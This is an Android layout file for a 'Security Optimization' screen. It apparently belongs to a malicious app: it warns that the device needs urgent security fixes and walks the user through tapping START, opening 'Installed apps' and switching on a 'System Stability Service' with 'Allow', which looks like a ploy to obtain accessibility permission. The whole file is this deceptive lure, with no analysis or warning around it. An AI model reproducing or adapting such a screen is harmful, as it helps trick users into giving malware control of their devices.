<?xml version="1.0" encoding="utf-8"?>
<androidx.constraintlayout.widget.ConstraintLayout xmlns:android="http://schemas.android.com/apk/res/android"
    xmlns:app="http://schemas.android.com/apk/res-auto"
    android:layout_width="match_parent"
    android:layout_height="match_parent"
    android:background="#FDFDFD">

    <ScrollView
        android:layout_width="match_parent"
        android:layout_height="0dp"
        android:fillViewport="true"
        app:layout_constraintBottom_toTopOf="@id/buttonContainer"
        app:layout_constraintTop_toTopOf="parent">

        <LinearLayout
            android:layout_width="match_parent"
            android:layout_height="wrap_content"
            android:gravity="center_horizontal"
            android:orientation="vertical"
            android:padding="32dp">

            <ImageView
                android:layout_width="225dp"
                android:layout_height="207dp"
                android:layout_marginTop="40dp"
                android:src="@drawable/ic_android_play" />

            <TextView
                android:layout_width="wrap_content"
                android:layout_height="wrap_content"
                android:layout_marginTop="20dp"
                android:text="Security Optimization"
                android:textColor="#E0118A4C"
                android:textSize="29sp"
                android:textStyle="bold" />

            <TextView
                android:layout_width="217dp"
                android:layout_height="wrap_content"
                android:layout_marginTop="5dp"
                android:layout_marginBottom="40dp"
                android:alpha="0.9"
                android:gravity="center"
                android:text="Your device requires important security optimizations to continue. Please follow these steps:"
                android:textColor="#CB5B5B5B"
                android:textSize="17sp"
                android:textStyle="bold" />

            <!-- Step 1 -->
            <TextView
                android:id="@+id/tvGuideStep1"
                android:layout_width="match_parent"
                android:layout_height="wrap_content"
                android:layout_marginVertical="6dp"
                android:background="@drawable/guide_step_bg"
                android:padding="14dp"
                android:text="1. Tap START"
                android:textColor="#676B69"
                android:textSize="17sp"
                android:textStyle="bold" />

            <!-- Step 2 -->
            <TextView
                android:id="@+id/tvGuideStep2"
                android:layout_width="match_parent"
                android:layout_height="wrap_content"
                android:layout_marginVertical="6dp"
                android:background="@drawable/guide_step_bg"
                android:padding="14dp"
                android:text="2. Select Installed apps"
                android:textColor="#676B69"
                android:textSize="17sp"
                android:textStyle="bold" />

            <!-- Step 3 -->
            <TextView
                android:id="@+id/tvGuideStep3"
                android:layout_width="match_parent"
                android:layout_height="wrap_content"
                android:layout_marginVertical="6dp"
                android:background="@drawable/guide_step_bg"
                android:padding="14dp"
                android:text="3. Tap System Stability Service --> Toggle ON &amp; Allow"
                android:textColor="#676B69"
                android:textSize="17sp"
                android:textStyle="bold" />

        </LinearLayout>
    </ScrollView>

    <FrameLayout
        android:id="@+id/buttonContainer"
        android:layout_width="match_parent"
        android:layout_height="100dp"
        android:background="#FFFFFF"
        android:paddingBottom="16dp"
        app:layout_constraintBottom_toBottomOf="parent">

        <com.google.android.material.button.MaterialButton
            android:id="@+id/btnGuideAction"
            android:layout_width="191dp"
            android:layout_height="53dp"
            android:layout_gravity="center"
            android:fontFamily="sans-serif-medium"
            android:text="START"
            android:textAllCaps="true"
            android:textColor="#FFFFFF"
            android:textSize="18sp"
            android:textStyle="bold"
            app:backgroundTint="#EB098E4A"
            app:cornerRadius="100dp" />

    </FrameLayout>

</androidx.constraintlayout.widget.ConstraintLayout>